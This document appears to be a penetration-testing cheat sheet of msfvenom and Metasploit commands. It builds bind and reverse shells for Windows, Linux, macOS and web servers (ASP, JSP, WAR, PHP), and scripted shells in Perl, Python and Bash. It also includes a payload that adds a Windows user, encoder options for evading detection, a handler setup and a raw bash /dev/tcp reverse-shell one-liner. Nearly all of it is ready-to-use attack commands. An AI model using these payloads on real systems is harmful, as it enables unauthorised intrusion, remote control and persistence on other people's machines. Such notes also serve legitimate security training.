## Payloads
To list  payloads used with msfvenom you can use the following command:

	msfvenom --list payloads

The primary payload you will be using is the: \<os>/meterpreter/reverse_tcp

##### Formats
You can get a list of formats by typing:

	msfvenom --list formats

Make sure you grep what you are looking for or this could be a really long list.

To create the exploit file type:
	
	msfvenom -p <payload> LHOST=<My_IP_Address> LPORT=<Listening_Port> -f <format>

##### Post Session Creations
You can CTRL+z to background the session

	use post/multi/recon/local_exploit_suggester 
	set SESSION 1
	run
	
## Bind Shells

##### Windows
Windows bind shell 

	msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe > bind.exe

##### Linux
Linux Bind Shall

	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf

##### MacOS
MacOS Bind Shell

	msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
	
## Other Interesting Items
##### Windows
Create a windows user

	msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe

Open cmd.exe prompt

	msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe

Encode your command

	msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

One can also use the -a to specify the architecture or the --platform
	
## Reverse Shells

All reverse shells require that you set up a listener within msfconsole the instructions are as follows. Note you dont set up the listnerer until you have built your msfvenom package. 

##### Metasploit Handler

	use exploit/multi/handler
 	set PAYLOAD <Payload name>
 	Set RHOST <Remote IP>
 	set LHOST <Local IP>
	 set LPORT <Local Port>


To create a windows reverse shell:

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe

To create linux reverse shell:

	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf >reverse.elf

If you are not using msfvenom but you have command access you can run:

	bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'

To create a MacOS reverse shell:

	msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho

## Scripting Languages

Perl Reverse Shall

	msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl

Python reverse shell:

	msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py

Bash Reverse Shell:

	msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh

## Web Based

to create an ASP reverse shell:

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp

To create a JSP reverse shell:

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp

To create a WAR Reverse shell:

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war

To create a PHP reverse shell

	msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
	
Return to [[-README]]